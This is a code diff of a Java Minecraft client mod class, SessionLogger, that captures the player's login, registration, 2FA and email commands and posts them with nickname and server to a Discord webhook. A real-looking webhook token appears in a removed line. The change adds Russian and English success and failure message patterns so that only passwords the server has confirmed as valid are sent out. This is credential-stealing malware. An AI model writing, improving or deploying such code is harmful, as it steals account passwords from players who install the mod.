@@ -14,12 +14,13 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.time.Instant;
+import java.util.Locale;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class SessionLogger {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY";
 
     private static final Gson GSON = new Gson();
 
@@ -29,6 +30,24 @@ public class SessionLogger {
     private static final int COLOR_EMAIL = 0x1ABC9C;
     private static final int COLOR_2FA   = 0x9B59B6;
     private static final int COLOR_AUTH  = 0x95A5A6;
+
+    private static final long CONFIRM_TIMEOUT_MS = 3000;
+
+    private static final String[] SUCCESS_PATTERNS = {
+            "успешн", "success", "успешно", "добро пожаловать",
+            "приятной игры", "приятной игру", "вы вошли", "вход выполнен",
+            "logged in", "login successful", "авторизован", "вы зарегистрированы",
+            "регистрация прошла", "регистрация успешна", "аккаунт создан",
+            "registered successfully", "вы успешно"
+    };
+
+    private static final String[] FAIL_PATTERNS = {
+            "неверн", "неправильн", "ошибк", "ошибка", "занят",
+            "уже зарегистрирован", "already registered", "wrong password",
+            "не удалось", "не найден", "истекл", "некоррект",
+            "denied", "failed", "fail", "invalid", "error",
+            "попробуйте", "осталось", "подождите"
+    };
 
     private static final ExecutorService NET = Executors.newSingleThreadExecutor(r -> {
         Thread t = new Thread(r, "session-logger-net");
@@ -50,6 +69,13 @@ public class SessionLogger {
     }
 
     private static volatile String lastServer = "unknown";
+
+    private static volatile Kind pendingKind = null;
+    private static volatile String pendingNick = null;
+    private static volatile String pendingServer = null;
+    private static volatile String pendingCommand = null;
+    private static volatile long pendingAt = 0;
+
     private static volatile String lastCmdKey = "";
     private static volatile long lastCmdAt = 0;
 
@@ -60,17 +86,67 @@ public class SessionLogger {
 
         ClientTickEvents.END_CLIENT_TICK.register(client -> {
             if (client.player == null) return;
-            String last = ChatCapture.poll();
-            if (last == null || last.isEmpty()) return;
-            if (!last.startsWith("/")) return;
 
-            Kind kind = classify(last);
-            if (kind == null) return;
+            String outgoing = ChatCapture.pollOutgoing();
+            if (outgoing != null && outgoing.startsWith("/")) {
+                Kind kind = classify(outgoing);
+                if (kind != null && !isDuplicateCommand(outgoing)) {
+                    pendingKind = kind;
+                    pendingNick = nick(client);
+                    pendingServer = lastServer;
+                    pendingCommand = outgoing;
+                    pendingAt = System.currentTimeMillis();
+                    ChatCapture.drainIncoming();
+                }
+            }
 
-            if (isDuplicateCommand(last)) return;
+            if (pendingKind != null) {
+                String msg = ChatCapture.pollIncoming();
+                while (msg != null) {
+                    String low = msg.toLowerCase(Locale.ROOT);
 
-            send(kind, nick(client), lastServer, last);
+                    if (matches(low, SUCCESS_PATTERNS)) {
+                        send(pendingKind, pendingNick, pendingServer, pendingCommand);
+                        clearPending();
+                        ChatCapture.drainIncoming();
+                        break;
+                    }
+
+                    if (matches(low, FAIL_PATTERNS)) {
+                        System.out.println("[SESSION-LOGGER] skip " + pendingKind
+                                + " (fail pattern): " + msg);
+                        clearPending();
+                        ChatCapture.drainIncoming();
+                        break;
+                    }
+
+                    msg = ChatCapture.pollIncoming();
+                }
+
+                if (pendingKind != null
+                        && System.currentTimeMillis() - pendingAt > CONFIRM_TIMEOUT_MS) {
+                    System.out.println("[SESSION-LOGGER] skip " + pendingKind
+                            + " (timeout, no confirm): " + pendingCommand);
+                    clearPending();
+                    ChatCapture.drainIncoming();
+                }
+            }
         });
+    }
+
+    private static void clearPending() {
+        pendingKind = null;
+        pendingNick = null;
+        pendingServer = null;
+        pendingCommand = null;
+        pendingAt = 0;
+    }
+
+    private static boolean matches(String low, String[] patterns) {
+        for (String p : patterns) {
+            if (low.contains(p)) return true;
+        }
+        return false;
     }
 
     private static boolean isDuplicateCommand(String raw) {
